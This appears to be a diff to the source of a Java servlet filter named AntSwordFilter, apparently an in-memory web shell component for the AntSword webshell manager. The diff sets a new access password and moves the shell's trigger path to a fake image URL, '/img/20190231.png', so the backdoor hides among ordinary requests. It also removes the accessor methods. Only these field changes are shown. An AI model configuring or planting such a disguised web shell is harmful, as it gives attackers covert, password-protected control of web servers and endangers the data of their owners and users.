@@ -24,24 +24,8 @@ public final class AntSwordFilter extends ClassLoader implements Filter {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
-    public String Pwd = "pass1024";
-    public String path = "/favicondemo.ico";
-
-    public String getPwd() {
-        return Pwd;
-    }
-
-    public void setPwd(String pwd) {
-        Pwd = pwd;
-    }
-
-    public String getPath() {
-        return path;
-    }
-
-    public void setPath(String path) {
-        this.path = path;
-    }
+    public String Pwd = "Y5neKO@2024";
+    public String path = "/img/20190231.png";
 
     public AntSwordFilter() {
     }
